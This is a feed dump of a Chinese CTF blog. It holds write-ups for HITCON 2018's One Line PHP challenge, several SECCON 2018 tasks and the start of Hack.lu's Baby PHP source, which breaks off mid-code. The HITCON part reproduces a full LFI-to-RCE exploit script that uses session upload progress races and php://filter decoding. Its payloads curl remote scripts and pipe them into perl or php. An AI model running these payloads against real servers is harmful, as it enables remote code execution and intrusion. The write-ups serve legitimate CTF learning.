        <content type="html"><![CDATA[<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>环境：<code>This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code> 。</p><p><img src="2018-10-23_200848.png" alt="alt"> </p><h1 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h1><ul><li><code>$_GET</code> 是一个数组，包含通过URL参数传给当前脚本的变量。如访问<code>localhost?orange=123&amp;foo=bar</code> ，则 <code>$_GET</code> 为 <code>array (&#39;orange&#39; =&gt; &#39;123&#39;,&#39;foo&#39; =&gt; &#39;bar&#39;,)</code> ，<code>$_GET[&#39;orange&#39;]</code> 为<code>&#39;123&#39;</code> 。另外，<code>$_GET</code> 是超全局变量，即在全部作用域中始终可用的内置变量。</li><li><code>@</code>被称为错误控制运算符（Error Control Operators）。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。例如对于内容为<code>&lt;?php $_=$_GET[&#39;orange&#39;];</code> 的PHP文件，直接访问其会报错 <code>Notice :  Undefined index: orange in...</code> ，加上 <code>@</code> 后就不会显示错误信息。</li><li>赋值操作。和C语言中的情况一样，赋值表达式的值就是赋值符号右侧的操作数的值。<code>The value of an assignment expression is the value assigned</code> 。</li><li><code>$_</code> 。一个普通的变量名。</li><li><code>file()</code> 。把整个文件读入数组中。<ul><li><code>array file ( string $filename [, int $flags = 0 [, resource $context ]] )</code>  </li><li><img src="1542959895935.png" alt="1542959895935"></li><li><img src="1542960054923.png" alt="1542960054923"> </li></ul></li><li><code>string substr ( string $string , int $start [, int $length ] )</code> 。</li><li>include 语句包含并运行指定文件。</li><li><code>(expr1) ? (expr2) : (expr3)</code> 是一个条件运算符，和C语言类似。</li><li>使用orange参数从URL传入一个文件名，如果该文件第一行的前六个字符是<code>@&lt;?php</code> ，就将它包含并运行。</li><li>相关文档： <a href="http://php.net/manual/en/language.operators.assignment.php" target="_blank" rel="noopener">Assignment Operators</a> , <a href="http://php.net/manual/en/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a> , <a href="http://php.net/manual/en/language.operators.errorcontrol.php" target="_blank" rel="noopener">Error Control Operators</a> ,  <a href="http://php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary" target="_blank" rel="noopener">三元运算符</a> </li></ul><h1 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h1><h2 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h2><p><code>allow_url_include</code> 默认值是<code>off</code> ，因此无法包含远程文件。那么如果要包含本地文件，就需要已知的文件名和可控的文件内容。</p><p>最主要的利用点在于：如果在上传文件的同时POST <code>PHP_SESSION_UPLOAD_PROGRESS</code> 参数，PHP就会为我们创建session，并且session文件名可以通过cookie中的PHPSESSID控制。</p><p>做个实验。</p><p>我的环境：<code>PHP7.2 + Apache on Kali 4.18</code> </p><p><img src="1542968416018.png" alt="1542968416018"></p><p>会发现确实如此。而且不仅如此。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking'</span> -F <span class="string">'file=@/etc/passwd'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange2'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking2'</span> -F <span class="string">'foobar=anystring'</span> 1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange3'</span> -F <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking3'</span>  1&gt;/dev/null</span><br><span class="line">curl -s 127.0.0.1/oneline.php -H <span class="string">'Cookie: PHPSESSID=iamnotorange4'</span> -d <span class="string">'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking4'</span>  1&gt;/dev/null</span><br></pre></td></tr></table></figure><p>我执行了四次请求。第一次是使用multipart传一个文件和一个字符串，可以同时生成session文件并且控制文件名，第二次传两个字符串，只能生成文件，文件名是随机的，第三次只有一个字符串，效果同第二次，第四个直接post一个字符串，无法生成session文件。四次请求的报文形式如下。</p><p><img src="1542969726963.png" alt="第一次"></p><p><img src="1542969783918.png" alt="第二次"></p><p><img src="1542969815646.png" alt="第三次"></p><p><img src="1542969856431.png" alt="第四次"></p><p>但是我们还会发现，无论怎样请求，文件内容总是为空，这是因为 <code>session.upload_progress.cleanup=on</code> ，导致文件一上传完马上被清空。这是我们可以用条件竞争或者传超大文件来保留文件内容。</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#loop.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> threadpool</span><br><span class="line"></span><br><span class="line">sessname=<span class="string">"iamnotorange"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner</span><span class="params">(i)</span>:</span></span><br><span class="line">cmd=<span class="string">"curl -s 127.0.0.1/oneline.php -H 'Cookie: PHPSESSID=%s' -F 'PHP_SESSION_UPLOAD_PROGRESS=this_is_findneo_speaking' -F 'file=@/etc/passwd' 1&gt;/dev/null"</span>%sessname</span><br><span class="line">os.system(cmd)</span><br><span class="line">os.system(<span class="string">"xxd /var/lib/php/sessions/sess_%s "</span>%sessname)</span><br><span class="line">pool=threadpool(<span class="number">30</span>)</span><br><span class="line">result=pool.map_async(runner,range(<span class="number">30</span>)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><img src="1542964721887.png" alt="1542964721887"></p><p>可以观察到，文件内容的前一部分是可控的。</p><h3 id="超大文件"><a href="#超大文件" class="headerlink" title="超大文件"></a>超大文件</h3><h2 id="变换文件内容"><a href="#变换文件内容" class="headerlink" title="变换文件内容"></a>变换文件内容</h2><p>到此为止，我们实现了控制文件名和文件内容，但是文件内容的形式是固定的，即以<code>upload_progress_</code> 开头，而我们期望他是以 <code>@&lt;?php</code> 开头。于是需要变换文件内容，可以利用 <code>php://filter</code> ，比如将文件内容多次base64解码得到我们想要的字符串。</p><p>base64解码的特点在于：</p><ul><li>可以将字符串每四个字符分一组，每组解码后变成三个字符，组与组之间互不影响。</li><li>base64编码后的字符串只会包含 <code>[0-9a-z-A-Z+\=]</code> ，如果解码时遇到这些字符之外的就会被忽略，或者说，解码前会先将非法字符删除。</li></ul><p>所以实际上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"import base64;print base64.b64decode('\x11\x22\x23\x24'*24+base64.b64encode('test'))"</span></span><br></pre></td></tr></table></figure><p>的执行结果还是test。</p><p>我们只要想办法让<code>upload_progress_</code> 解码后成为不合法字符从而被忽略就可以了，所以需要加一些垃圾数据。因为 <code>upload_progress_</code> 有16个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="结合利用"><a href="#结合利用" class="headerlink" title="结合利用"></a>结合利用</h1><p>将诸如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&lt;?php `curl remote.ip | php - ;?&gt;`</span><br></pre></td></tr></table></figure><p>的payload三次编码再加上填充数据后作为 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 的值上传，然后利用</p><p><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_whatever</code> 包含进来即可执行命令。可采用多线程竞争或者大文件上传保留session文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://54.250.246.238/'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        payload = xxx</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + payload + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    filename = <span class="string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> % filename</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'%s?orange=%s'</span> % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">'orange'</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li><a href="http://www.wupco.cn/?p=4460" target="_blank" rel="noopener">http://www.wupco.cn/?p=4460</a> </li><li><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a> </li><li><a href="https://bugs.php.net/bug.php?id=72681" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=72681</a> </li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SECCON 2018</title>
      <link href="/181028-seccon-wp/"/>
      <url>/181028-seccon-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>压缩命令为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'SECCON&#123;'</span>`cat key`<span class="string">'&#125;'</span> &gt; flag.txt</span><br><span class="line">zip -e --password=`perl -e <span class="string">"print time()"</span>` flag.zip flag.txt</span><br></pre></td></tr></table></figure><p>update:</p><p>###</p><p>比较棒的思路是flag.zip生成时刻的时间戳就是他的密码。那么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stat</span> -c %Y flag.zip</span><br><span class="line">1540566641</span><br></pre></td></tr></table></figure><p>###</p><p>爆破密码：</p><p><img src="1540714389474.png" alt="1540714389474"></p><p><img src="1540714399554.png" alt="1540714399554"></p><p><img src="1540714953343.png" alt="1540714953343"></p><h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk J</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">3912330       0x3BB28A        ARJ archive data, header size: 22472, version 1, minimum version to extract: 1, compression method: stored, file <span class="built_in">type</span>: binary, original name: <span class="string">"1"</span>, original file date: 1970-01-01 00:00:00, compressed file size: 538968064, uncompressed file size: 1441792, os: MS-DOS</span><br><span class="line"><span class="comment"># MS-DOS 以小端序存储数据</span></span><br><span class="line"></span><br><span class="line">$ strings -el J | grep SEC</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep CON</span><br><span class="line">...foo...</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">...bar...</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq</span><br><span class="line">...foo...</span><br><span class="line">&lt;SEC.txt</span><br><span class="line">&lt;CON&#123;.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;tktksec.txt</span><br><span class="line">&lt;F0r.txt</span><br><span class="line">&lt;ensic.txt</span><br><span class="line">&lt;s.txt</span><br><span class="line">&lt;_usnjrnl.txt</span><br><span class="line">&lt;2018&#125;.txt</span><br><span class="line">&lt;logfile.txt.0</span><br><span class="line"></span><br><span class="line">$ strings -el J | grep .txt | uniq | tail -n 10 | sed -E <span class="string">'s/&lt;(.*).txt.*/\1/g'</span> | tr  -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;F0rtktksecF0rensics_usnjrnl2018&#125;</span><br></pre></td></tr></table></figure><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Runme"><a href="#Runme" class="headerlink" title="Runme"></a>Runme</h2><p>misc式的水题。就是不断跟进函数，每个函数传入一个参数，拼凑起来就可以了。会得到 <code>&quot;C:\Temp\SECCON2018Online.exe&quot; SECCON{Runn1n6_P47h}</code> 。</p><p>update:</p><p>###</p><p>比较骚的做法是直接strings</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ strings runme</span><br><span class="line">!This program cannot be run <span class="keyword">in</span> DOS mode.</span><br><span class="line">...foo...</span><br><span class="line">BRjS</span><br><span class="line">BRjE</span><br><span class="line">BRjC</span><br><span class="line">BRjC</span><br><span class="line">BRjO</span><br><span class="line">BRjN</span><br><span class="line">BRj&#123;</span><br><span class="line">BRjR</span><br><span class="line">BRju</span><br><span class="line">...bar...</span><br><span class="line">$ strings runme | sed -E <span class="string">'s/BRj(.)/\1/g'</span> | tr -d <span class="string">'\n'</span> | grep -o <span class="string">'SECCON&#123;.*&#125;'</span></span><br><span class="line">SECCON&#123;Runn1n6_P47h&#125;</span><br></pre></td></tr></table></figure><p>###</p><h1 id="Media"><a href="#Media" class="headerlink" title="Media"></a>Media</h1><h2 id="Needle-in-a-haystack"><a href="#Needle-in-a-haystack" class="headerlink" title="Needle in a haystack"></a>Needle in a haystack</h2><p>提供一个YouTube的视频链接（<a href="https://www.youtube.com/watch?v=sTKP2btHSBQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=sTKP2btHSBQ</a> ），长达九个多小时。</p><p>从 <a href="https://y2mate.com/youtube/sTKP2btHSBQ" target="_blank" rel="noopener">https://y2mate.com/youtube/sTKP2btHSBQ</a> 下载360p的，差不多1.9G。快进查看会发现右下角有一个房间的灯亮灭很有规律，基本每分钟都会有变化。</p><p><img src="1540715588584.png" alt="1540715588584"></p><p>我们把亮记为1，暗记为0的话，整个视频时长545分钟，可以得到约545比特的信息。大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>其中有四种数据，<code>0</code>，<code>1</code> ，<code>000</code> ，<code>111</code> ，分别对应亮、暗、长亮、长暗四种状态，对应到摩斯电码则是<code>.</code> ，<code>短间隔</code>，<code>-</code> ，<code>长间隔</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        <span class="keyword">if</span> s[i:i+<span class="number">3</span>] == <span class="string">'000'</span>:</span><br><span class="line">            res+=<span class="string">' '</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i:i+<span class="number">3</span>] == <span class="string">'111'</span>:</span><br><span class="line">            res+=<span class="string">'-'</span></span><br><span class="line">            i+=<span class="number">3</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'1'</span>:</span><br><span class="line">            res+=<span class="string">'.'</span></span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">'0'</span>:</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">raw=<span class="string">'01010100010001110101110100011101011101000111011101110001110100011101011101110100010101000111011101110001110111000100011100010100011101110001000101010001110101010101110001011100011101010101011100010101000100011101011101000101110100010001110001110101010101110001110111000100010101000101010001011100011101110100010001110101010101110001110101010001011101000111011101110001011100011101010001110101110100010111000101010001110??01010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">may=<span class="string">'010101000100011101011101000111010111010001110111011100011101000111010111011101000101010001110111011100011101110001000111000101000111011100010001010100011101010101011100010111000111010101010111000101010001000111010111010001011101000100011100011101010101011100011101110001000101010001010100010111000111011101000100011101010101011100011101010100010111010001110111011100010111000111010100011101011101000101110001010100011100001010111000101010101000111000101010111000100010001110100010101110001010111010001010111000101000100011100010100010001010001111'</span></span><br><span class="line">print(do(may))</span><br><span class="line"><span class="comment"># ... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ..- ..... - ...- . . -. ..- ..-. ..- .. . - .. . .. -.</span></span><br><span class="line"><span class="comment"># http://rumkin.com/tools/cipher/morse.php</span></span><br><span class="line"><span class="comment"># SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTU5TVEENUFUIETIEIN</span></span><br></pre></td></tr></table></figure><p>天亮后看得很不清晰了，而且貌似 6h58min 之后窗户都会间歇性地被关上，所以flag的后半段有点问题。</p><p><img src="1540716372243.png" alt="1540716372243"></p><p>update:</p><p>###</p><p>实际上天亮以后用窗户的开关来表示，窗户打开为1，窗户关闭为0（正好和原来的处理方式01相反，所以得不到flag），思维太僵硬啊😂</p><p>那么就得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="linespan><br><span class="line">... . -.-. -.-. --- -. -.--. ... --- -- . - .. -- . ... -....- .- -....- ... . -.-. .-. . - -....- -- . ... ... .- --. . -....- -... .-. --- .- -.. -.-. .- ... - ... -....- -... --- .-.. -.. .-.. -.-- -.--.-</span><br><span class="line">SECCON(SOMETIMES-A-SECRET-MESSAGE-BROADCASTS-BOLDLY)</span><br></pre></td></tr></table></figure><p>这个图片解释得很到位了，不过我觉得徒手开关两个多小时的窗户太不黑客了吧，他们一定用了某种方式自动化。</p><p><img src="1540778376203.png" alt="1540778376203"></p><p>###</p><p>update2:</p><p>###</p><p>有大佬做了自动化，效果蛮好的。</p><p>（<a href="https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/" target="_blank" rel="noopener">https://ctf-writeups.ru/2k18/seccon-2018-online-ctf/needle_in_a_haystack/</a> ）</p><p>###</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Hack.lu CTF 2018 Baby PHP</title>
      <link href="/181022-hackluctf-web/"/>
      <url>/181022-hackluctf-web/</url>
      
        <content type="html"><![CDATA[<h1 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby PHP"></a>Baby PHP</h1><p>环境：<a href="https://arcade.fluxfingers.net:1819/" target="_blank" rel="noopener">https://arcade.fluxfingers.net:1819/</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123; </span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span 